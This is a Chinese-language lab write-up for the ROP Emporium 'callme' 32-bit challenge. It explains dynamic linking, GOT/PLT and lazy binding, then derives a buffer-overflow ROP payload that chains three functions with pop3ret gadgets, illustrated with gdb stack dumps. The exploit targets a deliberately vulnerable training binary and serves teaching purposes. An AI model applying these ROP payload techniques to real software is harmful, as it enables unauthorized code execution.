## Static Link 与 Dynamic Link
程式的 link 分为 `static link` 和 `dynamic link`

| Method | Desc | Pros & Cons |
| --- | --- | --- |
| Static Link | 会把外部函数的代码，一起打包到单一个执行档里 | 快，占空间 |
| Dynamic Link | 需先载入 shared library，等到要执行 library 里某个函数的时候 ，再 call (jmp进去) | 慢，省空间 |
<br>

* 为何后者省空间：若三个程式都要用 printf()，static link 需要加载三份 printf()，而 dynamic link 只需要加载一份。
* shared library = shared object (.so)

<br>

## GOT 与 PLT
问题：Dynamically linked 的程序，在 runtime 是如何執行到 shared library 里的函數呢？

先看看 GOT 与 PLT 两大功臣。

| Table | Section | Name | 功用 |
| --- | --- | --- | --- |
| GOT | .got.plt | Global Offset Table | 存 shared library 函数在内存中的实际位址（一个函数一条entry） |
| PLT | .plt | Procedure Linkage Table | (1) 存 shared library 函数在 GOT 对应到的 entry (2) 解析函数实际位址 |

简单来说：

1. 调用一个 shared library function 时，eip 会先跳到 PLT，然后立马跳到 GOT。
2. 如果是第一次呼叫某个外部函数，它在 GOT 中记录的「实际 address」，会是「未解析」的状态。
3. 该 GOT entry 此时所填的位址，会指向 PLT 中的「函数位址解析」函数
4. 此时会再跳回 PLT ，调用这个特殊函数来解析目标函数的位址。
5. 解析完成后， GOT entry 所记录的「实际 address」 就会自动更新，然后就正式调用该函数。
6. 下次调用该函数时，由于 GOT 已记录该函数的「实际 address」，已不再是「未解析」的状态了，所以可以直接调用。

详细：
1. http://www.qnx.com/developers/docs/qnxcar2/index.jsp?topic=%2Fcom.qnx.doc.neutrino.prog%2Ftopic%2Fdevel_Lazy_binding.html
2. https://ropemporium.com/guide.html

<br>

## Lazy Binding
问题：为什么需要 Lazy Binding？不能在程式执行前，就填好 GOT 吗？

可以。只要执行 `export LD_BIND_NOW=1` 然后运行你的程式即可，

但 startup time 会慢一点，因为要事先解析所有 shared library functions 的「实际address」（小程式感觉没啥差异）

<br>

## Reverse
上一题 (1-split) 我们藉由 bof 返回到 usefulFunction() 里的 `call system()`，以下我们称呼这种方法 ret2call。

ret2call 有个致命的缺点，就是我们没办法控制他的 return address，因为 return address 是由 call 指令把它 push 上去的。

---

所以在这题里，我们要改变策略，直接 ret2function 里，同时把 return address 与参数都摆在适合的地方。

但这题「必须」依序调用 callme_one(1,2,3) -> callme_two(1,2,3) -> callme_three(1,2,3) 才能取得 flag。

建构 payload：
```
11 * "AAAA" +
callme_one + "\x01\x00\x00\x00" + "\x02\x00\x00\x00" + "\x03\x00\x00\x00" +
callme_two + "\x01\x00\x00\x00" + "\x02\x00\x00\x00" + "\x03\x00\x00\x00" +
callme_three + "\x01\x00\x00\x00" + "\x02\x00\x00\x00" + "\x03\x00\x00\x00"
```

但这样是行不通的，如果我们直接用 gdb 进行 single stepping，当程序运行到 callme_one 的时候，stack 就坏了
```
 ► 0xf7fcf6d0 <callme_one>       push   ebp       # 刚进入 callme_one， push esp「尚未执行」
   0xf7fcf6d1 <callme_one+1>     mov    ebp, esp
   0xf7fcf6d3 <callme_one+3>     push   ebx
   0xf7fcf6d4 <callme_one+4>     sub    esp, 0x14
   0xf7fcf6d7 <callme_one+7>     call   __x86.get_pc_thunk.bx <0xf7fcf5a0>

   0xf7fcf6dc <callme_one+12>    add    ebx, 0x1924
   0xf7fcf6e2 <callme_one+18>    cmp    dword ptr [ebp + 8], 1
   0xf7fcf6e6 <callme_one+22>    jne    callme_one+219 <0xf7fcf7ab>

   0xf7fcf6ec <callme_one+28>    cmp    dword ptr [ebp + 0xc], 2
   0xf7fcf6f0 <callme_one+32>    jne    callme_one+219 <0xf7fcf7ab>

   0xf7fcf6f6 <callme_one+38>    cmp    dword ptr [ebp + 0x10], 3
─────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────
00:0000│ esp  0xffffc760 ◂— 0x1    # esp 应该要是 return address ！！！！！
01:0004│      0xffffc764 ◂— 0x2
02:0008│      0xffffc768 ◂— 0x3
03:000c│      0xffffc76c —▸ 0xf7dc000a ◂— '_realloc'
04:0010│      0xffffc770 —▸ 0xf7f8f000 ◂— 0x1e1d6c
... ↓
06:0018│      0xffffc778 ◂— 0x0
07:001c│      0xffffc77c —▸ 0xf7dc7a11 (__libc_start_main+241) ◂— add    esp, 0x10
```

<br>

我们错在哪？首先，ret2call不需要塞 return address，**但 ret2func / ret2libc 需要塞 return address**，

所以 payload 应该要长下面这样，是吧？（先不管 callme_three）
```
11 * "AAAA" +
callme_one + callme_two "\x01\x00\x00\x00" + "\x02\x00\x00\x00" + "\x03\x00\x00\x00"
```

我草，虽然 callme_one 结束可以 return 到 callme_two，但是又碰到了和什么一样的状况：stack 上没有 return address
```
 ► 0xf7fcf7cd <callme_two>        push   ebp        # 刚进入 callme_two， push esp「尚未执行」
   0xf7fcf7ce <callme_two+1>      mov    ebp, esp
   0xf7fcf7d0 <callme_two+3>      push   esi
   0xf7fcf7d1 <callme_two+4>      push   ebx
   0xf7fcf7d2 <callme_two+5>      sub    esp, 0x10
   0xf7fcf7d5 <callme_two+8>      call   __x86.get_pc_thunk.bx <0xf7fcf5a0>
──────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────
00:0000│ esp  0xffffc764 ◂— 0x1    # esp 应该要是 return address ！！！！！
01:0004│      0xffffc768 ◂— 0x2
02:0008│      0xffffc76c ◂— 0x3
03:000c│      0xffffc770 —▸ 0xf7f8000a ◂— 0x43140e0a
04:0010│      0xffffc774 —▸ 0xf7f8f000 ◂— 0x1e1d6c
05:0014│      0xffffc778 ◂— 0x0
06:0018│      0xffffc77c —▸ 0xf7dc7a11 (__libc_start_main+241) ◂— add    esp, 0x10
07:001c│      0xffffc780 ◂— 0x1
```

<br>

所以我归纳出一个 ROP Chain... Rule：

> 如果要用 ret2func 达成 ROP Chain，每次 return 前必须额外 ret2gadget 把目前函数的全部参数 pop 掉。

ret2gadget 要怎么选 gadget？ 有几个参数就 pop 几个。这题里面，三个函数都是带三个参数，所以选 pop3ret (pop * 3 + ret)
```
pop; pop; pop; ret
```

可以通过 `ROPGadget --binary callme32` 找到全部 ROP gadget 的位址，上述这个就是这样找到的。

<br>

## Pwn
Final payload：
```
11 * "AAAA" +
callme_one + pop3ret + "\x01\x00\x00\x00" + "\x02\x00\x00\x00" + "\x03\x00\x00\x00" +
callme_two + pop3ret + "\x01\x00\x00\x00" + "\x02\x00\x00\x00" + "\x03\x00\x00\x00" +
callme_three + "AAAA" + "\x01\x00\x00\x00" + "\x02\x00\x00\x00" + "\x03\x00\x00\x00"
```

ROP Chain:
```
pwnme() -> callme_one(1,2,3) -> callme_two(1,2,3) -> callme_three(1,2,3)
```

以上 payload 各行的说明：
1. padding
2. 返回到 callme_one(), callme_one(1,2,3) 结束时返回到 pop3ret。pop * 3 后...
3. 返回到 callme_two(), callme_two(1,2,3) 结束时返回到 pop3ret。pop * 3 后...
3. 返回到 callme_three(), callme_three(1,2,3) 结束时返回到 AAAA (we don't care)

<br>

## 结论
> 如果要用 ret2func 达成 ROP Chain，每次 return 前必须额外 ret2gadget 把目前函数的全部参数 pop 掉。
```
padding +
func1 + pop_n_ret + n * arguments +
func2 + pop_n_ret + n * arguments +
func3 + pop_n_ret + n * arguments +
...
```

不带参数的话，应该就不用 pop_n_ret 这步了，可以直接接下一个 func 的位址...吧 (?)
